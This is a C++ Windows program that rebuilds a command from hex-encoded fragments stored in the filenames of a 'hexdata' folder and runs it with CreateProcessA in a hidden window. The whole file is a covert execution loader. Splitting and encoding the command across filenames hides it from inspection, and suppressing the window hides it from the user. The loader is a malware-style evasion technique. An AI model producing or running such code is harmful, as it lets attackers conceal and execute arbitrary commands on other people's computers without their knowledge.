#include <windows.h>
#include <string>
#include <iostream>
#include <sstream>
#include <vector>
#include <algorithm>

constexpr int MAX_FILENAME_LENGTH = 256;
constexpr int MAX_MESSAGE_LENGTH = 1024;

static std::string hex_to_string(const std::string& hex) {
    std::string result;
    for (size_t i = 0; i < hex.length(); i += 2) {
        unsigned int byte;
        std::stringstream ss;
        ss << std::hex << hex.substr(i, 2);
        ss >> byte;
        result.push_back(static_cast<char>(byte));
    }
    return result;
}

// Utility function to extract the numeric part from the filename (before the "_")
int extract_number_from_filename(const std::string& filename) {
    size_t underscore_pos = filename.find('_');
    if (underscore_pos != std::string::npos) {
        return std::stoi(filename.substr(0, underscore_pos));  // Extract number before '_'
    }
    return -1;  // Return -1 if no number is found
}

int main() {
    const char* folder_name = "hexdata";  // Folder where the files are stored
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA((std::string(folder_name) + "\\*").c_str(), &findFileData);
    std::vector<std::string> files;
    std::string message = "";

    if (hFind == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open directory." << std::endl;
        return EXIT_FAILURE;
    }

    do {
        // Skip '.' and '..'
        if (findFileData.cFileName[0] == '.') {
            continue;
        }

        // Extract the file number and hex part from the filename
        std::string fileName = findFileData.cFileName;
        files.push_back(fileName);  // Add filename to list

    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);

    // Sort files numerically by the number extracted from the filename
    std::sort(files.begin(), files.end(), [](const std::string& a, const std::string& b) {
        return extract_number_from_filename(a) < extract_number_from_filename(b);
        });

    // Process each file in sorted order
    for (const auto& fileName : files) {
        // Extract hex part from the file name
        std::string hex_part = fileName.substr(fileName.find('_') + 1);
        hex_part = hex_part.substr(0, hex_part.find(".txt"));

        // Debugging: Print the file name and hex part extracted
        std::cout << "Processing file: " << fileName << std::endl;
        std::cout << "Extracted hex part: " << hex_part << std::endl;

        // Convert hex string to character and append to message
        if (!hex_part.empty()) {
            std::string character = hex_to_string(hex_part);
            message += character;  // Append to the message string
        }
    }

    // Check if message is empty
    if (message.empty()) {
        std::cerr << "No valid hex data to execute." << std::endl;
        return EXIT_FAILURE;
    }

    // Debugging: Print the final combined message
    std::cout << "Final message: " << message << std::endl;

    // Verify that the message can form a valid command
    if (message.empty() || message[0] == '\0') {
        std::cerr << "Invalid message formed. Exiting." << std::endl;
        return EXIT_FAILURE;
    }

    // Execute the command using CreateProcess
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    // Print the message to debug before executing
    std::cout << "Executing command: " << message << std::endl;

    if (!CreateProcessA(NULL, &message[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    // Wait for the process to finish if necessary, then close handles
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
